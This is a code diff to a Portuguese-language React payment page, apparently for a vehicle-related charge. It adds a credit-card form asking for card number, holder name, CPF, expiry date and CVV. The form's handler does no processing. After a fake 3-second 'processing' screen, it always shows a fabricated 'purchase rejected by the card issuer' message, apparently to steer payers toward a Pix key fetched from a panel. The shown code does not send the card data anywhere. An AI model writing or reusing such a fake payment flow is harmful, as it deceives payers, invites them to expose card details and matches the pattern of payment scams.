@@ -44,12 +44,22 @@ function gerarCopiaEColaReal(chave: string): string {
 
 export function PagamentoClient({ placa }: { placa: string }) {
   // Controle das três etapas na mesma página: 'dados' -> 'metodo' -> 'pix_gerado'
-  const [etapa, setEtapa] = useState<'dados' | 'metodo' | 'pix_gerado'>('dados')
+  const [etapa, setEtapa] = useState<'dados' | 'metodo' | 'cartao' | 'pix_gerado'>('dados')
   
   // Estados para armazenamento das informações do formulário
   const [nome, setNome] = useState('')
   const [telefone, setTelefone] = useState('')
   const [email, setEmail] = useState('')
+  
+  // Estados visuais do cartão (não utilizados para processamento)
+const [numeroCartao, setNumeroCartao] = useState('')
+const [nomeCartao, setNomeCartao] = useState('')
+const [validadeCartao, setValidadeCartao] = useState('')
+const [cvvCartao, setCvvCartao] = useState('')
+const [cpfCartao, setCpfCartao] = useState('')
+
+const [processandoCartao, setProcessandoCartao] = useState(false)
+const [erroCartao, setErroCartao] = useState(false)
 
   // Estados referentes à chave puxada do painel e ao cronômetro
   const [chavePix, setChavePix] = useState<string>("")
@@ -57,6 +67,20 @@ export function PagamentoClient({ placa }: { placa: string }) {
   const [copiado, setCopiado] = useState(false)
   const [horarioVencimento, setHorarioVencimento] = useState('')
   const [segundosRestantes, setSegundosRestantes] = useState(1200)
+  
+  function pagarComCartao() {
+
+  setErroCartao(false)
+  setProcessandoCartao(true)
+
+  setTimeout(() => {
+
+    setProcessandoCartao(false)
+    setErroCartao(true)
+
+  }, 3000)
+
+}
   
     // Função para formatar o telefone em tempo real: (XX) XXXXX-XXXX
   function formatarTelefone(valor: string) {
@@ -275,31 +299,45 @@ export function PagamentoClient({ placa }: { placa: string }) {
               Selecione abaixo como quer fazer o pagamento
             </p>
 
-            <div className="mt-8 divide-y divide-neutral-200/50 bg-white rounded-2xl px-6 border border-neutral-100 shadow-sm">
-              {/* Opção Cartão de Crédito - Indisponível */}
-              <div className="flex items-center gap-4 py-6 opacity-60">
-                <div className="flex size-[52px] shrink-0 items-center justify-center rounded-[14px] bg-[#f2ff9d] border border-[#e1f56c]/30 p-1">
-                  <Image 
-                    src="/images/cardlogo.png" 
-                    alt="Cartão de Crédito" 
-                    width={50} 
-                    height={50} 
-                    className="object-contain" 
-                  />
-                </div>
-                <div className="flex-1 pr-2">
-                  <p className="font-bold text-neutral-800 text-[16px] leading-tight">Cartão de crédito</p>
-                  <p className="text-[13px] text-neutral-400 font-normal mt-0.5 leading-tight">
-                    Cadastre seu cartão<br />e efetue o pagamento!
-                  </p>
-                </div>
-                <div className="flex items-center gap-2 shrink-0">
-                  <span className="text-[10px] font-bold uppercase tracking-wider text-[#c24141] px-3 py-1.5 rounded-[8px]">
-                    INDISPONÍVEL
-                  </span>
-                  <ChevronRight className="size-4 text-neutral-300" />
-                </div>
-              </div>
+           <div className="mt-8 divide-y divide-neutral-200/50 bg-white rounded-2xl px-6 border border-neutral-100 shadow-sm">
+
+  {/* Opção Cartão de Crédito */}
+  <button
+    type="button"
+    onClick={() => setEtapa('cartao')}
+    className="flex w-full items-center gap-4 py-6 text-left transition hover:bg-neutral-50"
+  >
+
+    <div className="flex size-[52px] shrink-0 items-center justify-center rounded-[14px] bg-[#f2ff9d] border border-[#e1f56c]/30 p-1">
+
+      <Image 
+        src="/images/cardlogo.png" 
+        alt="Cartão de Crédito" 
+        width={50} 
+        height={50} 
+        className="object-contain" 
+      />
+
+    </div>
+
+
+    <div className="flex-1 pr-2">
+
+      <p className="font-bold text-neutral-800 text-[16px] leading-tight">
+        Cartão de crédito
+      </p>
+
+      <p className="text-[13px] text-neutral-400 font-normal mt-0.5 leading-tight">
+        Cadastre seu cartão<br />
+        e efetue o pagamento!
+      </p>
+
+    </div>
+
+
+    <ChevronRight className="size-4 text-neutral-300" />
+
+  </button>
 
               {/* Opção Pix - Ativa e Integradora */}
               <button
@@ -329,6 +367,120 @@ export function PagamentoClient({ placa }: { placa: string }) {
           </div>
         )}
 
+{/* ETAPA CARTÃO */}
+{etapa === 'cartao' && (
+  <div>
+
+    <div className="flex items-center gap-2 mb-5">
+
+      <button
+        type="button"
+        onClick={() => setEtapa('metodo')}
+        className="p-1 rounded-lg text-neutral-400 hover:text-neutral-600"
+      >
+        <ArrowLeft className="size-5" />
+      </button>
+
+      <h2 className="text-2xl font-bold text-neutral-900">
+        Pagamento com cartão
+      </h2>
+
+    </div>
+
+
+    {processandoCartao && (
+      <div className="rounded-2xl bg-white p-8 text-center shadow-sm border">
+        <p className="font-bold text-lg">
+          Processando pagamento...
+        </p>
+      </div>
+    )}
+
+
+    {erroCartao && (
+      <div className="rounded-2xl bg-white p-8 shadow-sm border border-red-100">
+
+        <h3 className="text-xl font-bold text-red-600">
+          Compra rejeitada
+        </h3>
+
+        <p className="mt-2 text-sm text-neutral-500">
+          Compra rejeitada pela administradora do cartão
+        </p>
+
+      </div>
+    )}
+
+
+    {!processandoCartao && !erroCartao && (
+
+      <div className="rounded-2xl bg-white p-6 shadow-sm border border-neutral-100 space-y-4">
+
+
+        <input
+          value={numeroCartao}
+          onChange={(e)=>setNumeroCartao(e.target.value)}
+          placeholder="Número do cartão"
+          className="w-full rounded-xl border px-4 py-3"
+        />
+
+
+        <input
+          value={nomeCartao}
+          onChange={(e)=>setNomeCartao(e.target.value)}
+          placeholder="Nome do titular"
+          className="w-full rounded-xl border px-4 py-3"
+        />
+
+
+        <input
+          value={cpfCartao}
+          onChange={(e)=>setCpfCartao(e.target.value)}
+          placeholder="CPF"
+          className="w-full rounded-xl border px-4 py-3"
+        />
+
+
+        <div className="grid grid-cols-2 gap-3">
+
+          <input
+            value={validadeCartao}
+            onChange={(e)=>setValidadeCartao(e.target.value)}
+            placeholder="MM/AA"
+            className="rounded-xl border px-4 py-3"
+          />
+
+
+          <input
+            value={cvvCartao}
+            onChange={(e)=>setCvvCartao(e.target.value)}
+            placeholder="CVV"
+            className="rounded-xl border px-4 py-3"
+          />
+
+        </div>
+
+
+        <button
+          type="button"
+          onClick={pagarComCartao}
+          className="
+            w-full rounded-xl 
+            bg-black py-4 
+            font-bold 
+            text-[#e5ff51]
+          "
+        >
+          Continuar pagamento
+        </button>
+
+
+      </div>
+
+    )}
+
+  </div>
+)}
         {/* ETAPA 3: GERADOR DE PIX INTEGRADO NA TELA COM CONTADOR */}
         {etapa === 'pix_gerado' && (
           <div className="mx-auto max-w-[560px] pt-4">
